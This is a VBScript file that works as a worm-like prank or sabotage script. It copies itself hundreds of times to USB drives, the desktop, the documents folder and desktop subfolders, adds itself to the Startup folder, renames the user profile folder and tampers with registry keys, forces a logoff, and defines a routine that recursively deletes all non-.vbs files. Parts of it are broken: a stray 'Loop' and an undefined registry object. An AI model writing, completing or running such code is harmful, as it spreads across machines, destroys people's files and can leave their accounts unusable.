Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strScriptPath = WScript.ScriptFullName

' Specify the folders in which you want to delete files (modify as needed)
foldersToDelete = Array("C:\Folder1", "C:\Folder2", "C:\Folder3")

' Get the path to the desktop folder
strDesktopFolder = objShell.SpecialFolders("Desktop")

' Get the path to the documents folder
strDocumentsFolder = objShell.SpecialFolders("MyDocuments")

' Specify the number of copies to create
numCopies = 999

' Find the USB drive
usbDrivePath = ""
Set colDrives = objFSO.Drives

For Each objDrive In colDrives
    If objDrive.DriveType = 1 And objDrive.IsReady Then ' Check if the drive is a removable drive (USB)
        usbDrivePath = objDrive.Path
        Exit For
    End If
Next

' Check if a USB drive was found
If usbDrivePath <> "" Then
    ' Generate copies of the script on the USB drive
    On Error Resume Next ' Ignore errors
    For i = 1 To numCopies
        randomIteration = Int((1000 * Rnd) + 1)

        strCopyPath = usbDrivePath & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
        objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
    Next
    On Error GoTo 0 ' Reset error handling
End If

' Create copies of the script on the desktop and in the documents folder
On Error Resume Next ' Ignore errors
For i = 1 To numCopies
    randomIteration = Int((1000 * Rnd) + 1)

    ' Create a copy of the script on the desktop
    strDesktopCopyPath = strDesktopFolder & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
    objFSO.CopyFile strScriptPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files

    ' Create a copy of the script in the documents folder
    strDocumentsCopyPath = strDocumentsFolder & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
    objFSO.CopyFile strScriptPath, strDocumentsCopyPath, True ' Add "True" to overwrite existing files
Next
On Error GoTo 0 ' Reset error handling

' Add the script to the startup folder
On Error Resume Next ' Ignore errors
startupFolder = objShell.SpecialFolders("Startup")
objFSO.CopyFile strScriptPath, startupFolder & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎.vbs", True ' Add "True" to overwrite existing files
On Error GoTo 0 ' Reset error handling

' Function to change the username
Sub ChangeUsername(newUsername)
    ' Rename the user profile folder
    Set wshNetwork = CreateObject("WScript.Network")
    oldUsername = wshNetwork.UserName
    userProfilePath = "C:\Users\" & oldUsername
    newProfilePath = "C:\Users\" & newUsername
    
    ' Rename the user profile folder
    objFSO.MoveFolder userProfilePath, newProfilePath
    
    ' Update the username in the registry
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMI.ExecQuery("SELECT SID FROM Win32_UserAccount WHERE Name = '" & oldUsername & "'")
    
    For Each objItem In colItems
        sid = objItem.SID
        Exit For
    Next
    
    If Not IsEmpty(sid) Then
        strKeyPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\" & sid
        objRegistry.DeleteKey &H80000001, strKeyPath ' Delete the old registry key
        
        ' Create a new registry key with the updated username
        strKeyPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\" & sid
        objRegistry.CreateKey &H80000001, strKeyPath
        
        ' Set the ProfileImagePath value in the new registry key
        objRegistry.SetStringValue &H80000001, strKeyPath, "ProfileImagePath", newProfilePath
    End If
End Sub

' Call the ChangeUsername function with the new desired username
newUsername = "☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎"
ChangeUsername newUsername

    ' Generate copies of the script within each folder on the Desktop
    For Each objFolder In objFSO.GetFolder(strDesktopFolder).Subfolders
        On Error Resume Next ' Ignore errors
        For i = 1 To numCopies
            randomIteration = Int((1000 * Rnd) + 1)
            strCopyPath = objFolder.Path & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
            objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
        Next
        On Error GoTo 0 ' Reset error handling
    Next

    ' Remove apps from the taskbar
    objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\TaskbarSmallIcons", 1, "REG_DWORD"
    objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\MMTaskbarEnabled", 0, "REG_DWORD"

    ' Log out the current user
    objShell.Run "shutdown -l -f", 0, True
Loop

Sub DeleteFilesExceptVBS(folderPath)
    On Error Resume Next

    Set folder = objFSO.GetFolder(folderPath)
    If Err.Number = 0 Then
        For Each file In folder.Files
            Dim extension
            extension = LCase(objFSO.GetExtensionName(file.Path))
            If extension <> "vbs" Then
                objFSO.DeleteFile file.Path
            End If
        Next

        ' Recursively delete files in subfolders
        For Each subfolder In folder.Subfolders
            DeleteFilesExceptVBS subfolder.Path
        Next
    End If

    On Error GoTo 0
End Sub
